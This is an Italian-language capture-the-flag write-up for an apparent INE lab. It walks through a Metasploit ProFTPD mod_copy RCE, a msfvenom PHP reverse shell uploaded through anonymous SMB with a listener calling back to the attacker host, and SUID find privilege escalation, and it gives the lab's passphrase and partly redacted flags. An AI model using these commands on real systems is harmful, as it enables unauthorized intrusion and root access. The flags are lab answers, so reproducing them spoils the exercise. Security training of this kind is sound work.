## Exploitation 3: Mini Writeup

### FLAG1: ProFTPD mod_copy RCE

1. **Carica e configura il modulo Metasploit**  
   ```bash
   msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
   msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options


2. **Imposta le opzioni**

   ```bash
   set RHOSTS     target1.ine.local
   set RPORT      80
   set RPORT_FTP  21
   set SITEPATH   /var/www/html
   set TARGETURI  /
   set TMPPATH    /tmp
   set LHOST      192.40.111.2
   set LPORT      4444
   ```
3. **Esegui l’exploit**

   ```bash
   run
   ```
4. **Recupera la flag**

   ```bash
   cat flag1.txt
   # FLAG1{3c650[REDACTED]fa964d168bc}
   ```
5. **Nota**: la passphrase segreta che compare dopo è **letmein**.

---

### FLAG2: Servizio locale con passphrase

1. **Verifica le porte in ascolto**

   ```bash
   netstat -tuln
   ```

   > Si nota un servizio in ascolto su `127.0.0.1:8888`.
2. **Connettiti in locale**

   ```bash
   nc 127.0.0.1 8888
   ```
3. **Inserisci la passphrase**

   ```
   Enter the secret passphrase: letmein
   ```
4. **Leggi la flag**

   ```bash
   # FLAG2{cb9fc[REDACTED]aca7b39}
   ```

---

### FLAG3: Upload PHP reverse shell via SMB anonimo

1. **Accesso anonimo a SMB**

   ```bash
   smbclient //target2.ine.local/site-uploads -N
   ```
2. **Genera la shell PHP**

   ```bash
   msfvenom -p php/reverse_php \
     LHOST=192.40.111.2 LPORT=4444 \
     -f raw -o shell.php
   ```
3. **Carica la shell su SMB**

   ```bash
   smb> put shell.php
   ```
4. **Avvia il listener**

   ```bash
   nc -lvnp 4444
   ```
5. **Triggera la shell via HTTP**

   ```bash
   curl http://target2.ine.local/site-uploads/shell.php
   ```
6. **Recupera la flag**

   ```bash
   cat /flag3.txt
   # FLAG3{bc36e47[REDACTED]1251}
   ```

---

### FLAG4: Privilege escalation via SUID `find`

1. **Trova i binari SUID**

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

   > Tra gli altri, `/usr/bin/find` è SUID root.
2. **Usa `find` per leggere la flag di root**

   ```bash
   /usr/bin/find / -exec cat /root/flag4.txt \; -quit
   ```
3. **Output**

   ```
   FLAG4{447ddc1[REDACTED]a9be3bf2}
   ```

